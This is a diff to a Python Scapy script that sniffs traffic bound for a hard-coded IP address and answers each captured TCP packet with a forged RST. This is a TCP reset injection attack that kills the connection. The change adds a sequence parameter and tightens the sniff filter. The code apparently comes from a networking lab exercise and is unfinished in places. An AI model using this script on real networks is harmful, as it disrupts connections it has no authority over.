@@ -14,11 +14,11 @@ def logRST(p):
     dst_ip = p[IP].dst
     dst_port = p[TCP].dport
     seq = p[TCP].seq
-    ack = p[TCP].ack
+    ack = p[TCP].ack# End of code taken from RH
     window = p[TCP].window
-    flags = p[TCP].flags  # End of code taken from RH
 
-    sendRST(dst_ip, dst_port, src_ip, src_port, ack, window)
+
+    sendRST(dst_ip, dst_port, src_ip, src_port, seq, ack, window)
 
     print("---Found packet---\nsource: %s\nport: %s\nseq: %s\nack: %s"
           % (src_ip, src_port, seq, ack))
@@ -26,7 +26,7 @@ def logRST(p):
     return True
 
 
-def sendRST(dst_ip, dst_port, src_ip, src_port, ack, window):
+def sendRST(dst_ip, dst_port, src_ip, src_port, seq, ack, window):
     ip = IP(src=dst_ip, dst=src_ip)
     tcp = TCP(sport=dst_port, dport=src_port, flags="R", window=window, seq=ack)  # Fix seq + ack
     p = Ether() / ip / tcp
@@ -35,9 +35,11 @@ def sendRST(dst_ip, dst_port, src_ip, src_port, ack, window):
 
 def sniffPackets(DST_IP):
     print("Sniffing for packets sent to: %s" % DST_IP)
-    p = sniff(filter="host "+DST_IP, prn=logRST, count=10, iface="en0")
+    p = sniff(filter="dst host "+DST_IP, prn=logRST, count=10, iface="en0")
 
 def main():
+    #dst_ip = sys.args[0]
+    #sniffPackets(dst_ip)
 
     #sniffPackets("127.0.0.1")
     sniffPackets("131.229.72.7")
